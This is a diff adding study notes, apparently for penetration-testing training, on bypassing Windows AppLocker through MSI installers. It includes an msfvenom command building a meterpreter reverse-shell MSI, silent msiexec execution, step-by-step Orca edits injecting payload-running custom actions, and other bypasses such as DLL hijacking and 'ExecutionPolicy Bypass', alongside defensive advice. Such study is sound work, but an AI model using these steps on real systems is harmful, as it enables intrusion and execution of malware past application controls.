@@ -73,6 +73,232 @@ extern "C" __declspec(dllexport) void run()
 - Code signing bypass example: https://forensicitguy.github.io/making-meterpreter-look-google-signed/
 - other ways to embed a non-java payload with a signed msi?
 
+Bypassing AppLocker using installer packages is a well-known technique that leverages the trust that AppLocker places in certain signed executables, such as `msiexec.exe` or other installer-related binaries. Here's how this can be done:
+
+### **Understanding AppLocker**
+
+AppLocker is a Windows feature that allows administrators to control which applications and files users can run. AppLocker rules can be applied based on file path, file hash, or publisher. While it's a robust security feature, misconfigurations or inherent trust in certain executables can lead to bypasses.
+
+### **Bypassing AppLocker with Installer Packages**
+
+One of the common methods to bypass AppLocker involves using the Windows Installer (msiexec.exe) or other installer-related binaries that are typically allowed to run by AppLocker due to being signed by Microsoft.
+
+#### **Method 1: Using `msiexec.exe` to Run a Malicious MSI File**
+
+1. **Create a Malicious MSI Package:**
+   - You can use tools like **msfvenom** to create an MSI package with a payload.
+   - Example using **msfvenom**:
+     ```bash
+     msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f msi > payload.msi
+     ```
+
+2. **Execute the MSI Package with `msiexec.exe`:**
+   - Use `msiexec.exe` to run the MSI package:
+     ```bash
+     msiexec /quiet /i payload.msi
+     ```
+   - `msiexec.exe` is a trusted binary, and if AppLocker is not configured to block it, this command will execute the MSI, bypassing AppLocker restrictions.
+
+#### **Method 2: Using Unsigned Executables within a Trusted Installer**
+
+1. **Prepare an Executable:**
+   - Compile or obtain an unsigned executable that you wish to run on the target system.
+
+2. **Create an MSI Package:**
+   - Package the unsigned executable within an MSI using a tool like **WiX Toolset** or **Advanced Installer**.
+
+3. **Run the MSI via `msiexec.exe`:**
+   - Execute the MSI using `msiexec.exe` as described above. Since the MSI package is processed by a trusted binary (`msiexec.exe`), AppLocker may allow the unsigned executable within the MSI to run.
+
+#### **Method 3: Exploiting Installers with Custom Actions**
+
+1. **Modify an Existing MSI:**
+   - Modify an existing MSI installer to include custom actions that execute your payload.
+   - Custom actions can be set up to run arbitrary code during the installation process.
+
+2. **Run the Modified MSI:**
+   - Similar to the above methods, execute the MSI using `msiexec.exe` to trigger the custom action and run your payload.
+
+### **Defensive Considerations**
+
+To protect against such bypass techniques:
+- **Whitelist by File Hash:** Whitelisting by file hash rather than by path or publisher can prevent trusted binaries from being abused.
+- **Audit AppLocker Logs:** Regularly audit AppLocker logs to detect unusual use of installer packages.
+- **Restrict Installation Privileges:** Limit the ability of users to execute `msiexec.exe` or other installer binaries unless necessary.
+- **Use Device Guard:** Implement additional security controls like Device Guard to restrict code execution more granularly.
+
+### **Conclusion**
+
+Bypassing AppLocker using installer packages is a technique that exploits the trust Windows places in certain binaries like `msiexec.exe`. While effective, this method highlights the importance of robust and carefully configured security controls to mitigate such risks.
+
+Modifying an existing MSI file to include custom actions or payloads can be done using tools like **Orca**, **InstEd**, or **WiX Toolset**. Below, I’ll guide you through the process using Orca, a tool provided by Microsoft, which allows for detailed editing of MSI files.
+
+### **Step-by-Step Guide to Modify an Existing MSI File**
+
+#### **Step 1: Download and Install Orca**
+
+1. **Download Orca:**
+   - Orca is part of the Windows SDK. You can download the SDK [here](https://developer.microsoft.com/en-us/windows/downloads/windows-10-sdk/).
+
+2. **Install Orca:**
+   - During the SDK installation, select only the **Windows Installer XML (WiX) Toolset** or **Orca** if it is available as a standalone component.
+
+3. **Launch Orca:**
+   - After installation, you can find Orca in your Start Menu or by searching `Orca`.
+
+#### **Step 2: Open the MSI File in Orca**
+
+1. **Open Orca:**
+   - Launch the Orca tool.
+
+2. **Load the MSI File:**
+   - Go to `File > Open` and select the MSI file you want to modify.
+
+#### **Step 3: Modify the MSI File**
+
+1. **Add Custom Actions:**
+   - **Navigate to the `CustomAction` table** in Orca. This table defines custom actions that can be executed during the installation process.
+   - **Add a new row** with the following details:
+     - **Action**: Name your custom action (e.g., `RunPayload`).
+     - **Type**: Define the type of action (e.g., `307` for executing a command).
+     - **Source**: Path to the executable or script.
+     - **Target**: The command to be executed.
+
+2. **Modify the `InstallExecuteSequence` Table:**
+   - **Navigate to the `InstallExecuteSequence` table**.
+   - **Add a new row** or modify an existing one to include your custom action.
+     - **Action**: Name of your custom action (must match the one in `CustomAction` table).
+     - **Condition**: When the action should be executed (leave empty for always).
+     - **Sequence**: The order in which the action should be executed during the installation.
+
+3. **Inject a Payload (if applicable):**
+   - If you’re adding a payload (e.g., an executable), you can either:
+     - **Embed it in the MSI:**
+       - Add it to the `Binary` table, then reference it in the `CustomAction` table.
+     - **Download or execute it externally:**
+       - Use a `CustomAction` to run a command that downloads or executes the payload.
+
+#### **Step 4: Save the Modified MSI**
+
+1. **Save the Changes:**
+   - After making your modifications, save the MSI file.
+   - Go to `File > Save As`, and save the modified MSI with a new name to avoid overwriting the original.
+
+#### **Step 5: Test the Modified MSI**
+
+1. **Test the Installation:**
+   - Run the modified MSI file on a test machine to ensure that the modifications work as expected.
+
+2. **Monitor the Installation:**
+   - Use tools like Process Monitor, Event Viewer, or simply watch the directories to see if your custom actions are executed correctly.
+
+### **Important Notes**
+
+- **Legal and Ethical Considerations:** Modifying MSI files, especially to inject malicious code, can have legal and ethical implications. Ensure you have proper authorization to modify the software.
+- **Digital Signatures:** Modifying an MSI file will break its digital signature. If the MSI is signed, the user may receive a warning during installation unless it’s re-signed.
+- **Testing:** Always thoroughly test modified MSI files in a controlled environment before deploying them in production.
+
+This process provides a basic overview of how to modify an existing MSI file. More complex modifications might require in-depth knowledge of the MSI format and the Windows Installer service.
+
+Windows Installer default rules, especially when enforced by tools like AppLocker or Software Restriction Policies (SRP), are designed to control which applications can run on a Windows system. Understanding these default rules is key to both securing your environment and understanding potential bypass techniques.
+
+### **Default Windows Installer Rules**
+
+Windows Installer rules in AppLocker or SRP typically permit the execution of the following:
+
+1. **Trusted Installers (`msiexec.exe`):**
+   - The `msiexec.exe` binary, which is part of the Windows Installer service, is usually allowed by default because it is a system file signed by Microsoft. This executable is responsible for installing, modifying, and removing applications that are packaged as MSI files.
+
+2. **Programs Installed in Program Files and Windows Directory:**
+   - Executables located in trusted directories like `C:\Program Files`, `C:\Program Files (x86)`, and `C:\Windows` are usually allowed to run because these directories are trusted locations.
+
+3. **Publisher Rules:**
+   - Applications signed by trusted publishers, especially Microsoft, may be allowed to run based on their digital signature.
+
+4. **Path Rules:**
+   - Certain paths may be explicitly allowed, permitting executables within these directories to run.
+
+### **Potential Bypass Techniques**
+
+Given the above default rules, several bypass techniques can be employed if the AppLocker or SRP configuration is not stringent enough:
+
+#### **1. Using `msiexec.exe` to Execute Malicious MSI Files**
+
+- **Technique:** Since `msiexec.exe` is a trusted executable, attackers can create a malicious MSI package that contains a payload. Running this package via `msiexec.exe` would execute the payload.
+  
+  ```powershell
+  msiexec /quiet /i payload.msi
+  ```
+
+- **Why It Works:** AppLocker and SRP might trust `msiexec.exe` by default and allow it to run any MSI package, even if the package itself is malicious.
+
+#### **2. Dropping Executables in Trusted Directories**
+
+- **Technique:** An attacker with write access to a trusted directory (like `C:\Program Files` or `C:\Windows\Temp`) could drop an executable there, which would then be allowed to run by default.
+  
+  - **Example:** Dropping a payload in `C:\Windows\Temp\malware.exe` and executing it.
+
+- **Why It Works:** These directories are typically allowed by default, assuming that anything within them is trusted.
+
+#### **3. DLL Hijacking**
+
+- **Technique:** AppLocker and SRP primarily focus on executable files (`.exe`), but they might not control DLLs as strictly. An attacker could replace or inject a malicious DLL into a location where a trusted executable will load it.
+
+  - **Example:** Placing a malicious `msvcrt.dll` in the same directory as a trusted application that will load it at runtime.
+
+- **Why It Works:** If the directory containing the DLL is trusted, the application will load it, potentially allowing the attacker to execute arbitrary code.
+
+#### **4. Exploiting Allowed Scripts or Macros**
+
+- **Technique:** If scripts like PowerShell or VBScript are allowed, an attacker could run malicious scripts that bypass AppLocker rules. Similarly, Office macros, if allowed, can be exploited to execute malicious code.
+
+  - **Example:** A PowerShell script that downloads and executes a payload.
+
+  ```powershell
+  powershell -ExecutionPolicy Bypass -File script.ps1
+  ```
+
+- **Why It Works:** AppLocker might allow script engines like `powershell.exe` or `cscript.exe` by default.
+
+#### **5. Utilizing Trusted Publisher Signing**
+
+- **Technique:** If AppLocker allows binaries signed by a trusted publisher, an attacker might find or create a signed binary (even if it's from a third party) that performs unintended actions.
+
+  - **Example:** Using a legitimate signed executable that can be coerced into running a malicious DLL or script.
+
+- **Why It Works:** The focus is on the publisher's signature, not on the behavior of the executable.
+
+#### **6. In-Memory Execution**
+
+- **Technique:** Some tools and scripts can execute code directly in memory without dropping an executable to disk, thereby bypassing AppLocker or SRP.
+
+  - **Example:** Tools like `PowerShell`, `Cobalt Strike`, or `Reflective DLL Injection` techniques can execute code in memory.
+
+- **Why It Works:** Since there's no physical file to check, AppLocker rules don't apply.
+
+### **Defensive Measures**
+
+To protect against these bypass techniques:
+
+1. **Enforce Strict AppLocker Rules:**
+   - Use hash or certificate rules instead of path rules where possible.
+   - Monitor and restrict the use of `msiexec.exe` and other trusted installer binaries.
+   - Implement rules that cover not only executables but also scripts, DLLs, and other potential attack vectors.
+
+2. **Limit Write Access to Trusted Directories:**
+   - Ensure that only trusted administrators have write access to directories like `C:\Windows` and `C:\Program Files`.
+
+3. **Use Windows Defender Application Control (WDAC):**
+   - WDAC provides more granular control over what can run on your systems, including DLLs and scripts, and can be a more secure alternative to AppLocker.
+
+4. **Regular Auditing:**
+   - Continuously audit the execution of installers and other high-risk binaries, looking for anomalies or signs of misuse.
+
+5. **Disable Macros and Unnecessary Scripting Languages:**
+   - If possible, disable or restrict the use of macros, PowerShell, and other scripting engines.
+
+By understanding these default rules and potential bypasses, you can better secure your environment against these attack vectors.
+
 #### 8.2.3 Alternate Data Streams
 
 - **Alternate Data Stream (ADS)** is a binary file attribute that contains metadata
